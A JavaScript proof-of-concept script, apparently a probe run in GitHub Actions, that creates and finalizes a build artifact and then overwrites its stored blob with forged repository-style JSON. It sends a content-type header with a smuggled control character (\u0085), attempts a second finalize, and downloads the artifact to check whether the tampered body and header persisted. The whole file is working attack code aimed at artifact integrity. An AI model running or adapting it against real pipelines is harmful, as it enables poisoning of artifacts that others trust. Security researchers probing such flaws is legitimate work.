import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';

const client = internalArtifactTwirpClient({maxAttempts: 1});
const backend = getBackendIdsFromToken();
const name = `refinalize-overwrite-${process.env.GITHUB_RUN_ID}.json`;
const placeholder = Buffer.from('{}');
const made = await client.CreateArtifact({
  ...backend,
  name,
  version: 7,
  mimeType: StringValue.create({value: 'application/octet-stream'}),
});
if (!made.ok) throw new Error('create-not-ok');
const block = new BlobClient(made.signedUploadUrl).getBlockBlobClient();
await block.uploadData(placeholder, {
  blobHTTPHeaders: {blobContentType: 'application/octet-stream'},
});
const firstFinalize = await client.FinalizeArtifact({
  ...backend, name, size: String(placeholder.length),
});
if (!firstFinalize.ok) throw new Error('first-finalize-not-ok');

const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${firstFinalize.artifactId}/zip`;
const finalBody = Buffer.from(JSON.stringify({
  full_name: repository,
  owner: {login: 'control', avatar_url: 'https://avatars.githubusercontent.com/u/1?v=4'},
  description: 'refinalize-overwrite-marker',
  stargazers_count: 0,
}));
await block.uploadData(finalBody, {
  blobHTTPHeaders: {blobContentType: '\u0085application/json'},
});
let secondFinalize;
try {
  const again = await client.FinalizeArtifact({
    ...backend, name, size: String(finalBody.length),
  });
  secondFinalize = {ok: again.ok, artifactId: String(again.artifactId)};
} catch (error) {
  secondFinalize = {error: String(error?.message || error).replace(/[\r\n]+/g, ' ').slice(0, 220)};
}

const first = await fetch(
  `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/artifacts/${firstFinalize.artifactId}/zip`,
  {
    headers: {
      Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
      Accept: 'application/vnd.github.v3+json',
      'User-Agent': 'repo-cassette-refinalize-overwrite-probe',
    },
    redirect: 'manual',
  },
);
const location = first.headers.get('location');
const final = location ? await fetch(location) : first;
const bytes = Buffer.from(await final.arrayBuffer());
const finalType = final.headers.get('content-type') || '';
console.log('REFINALIZE_OVERWRITE_RESULT', JSON.stringify({
  firstArtifactId: String(firstFinalize.artifactId),
  secondFinalize,
  firstStatus: first.status,
  finalStatus: final.status,
  finalTypeCodePoints: Array.from(finalType, c => c.codePointAt(0)),
  bodyMatches: bytes.equals(finalBody),
  size: bytes.length,
}));
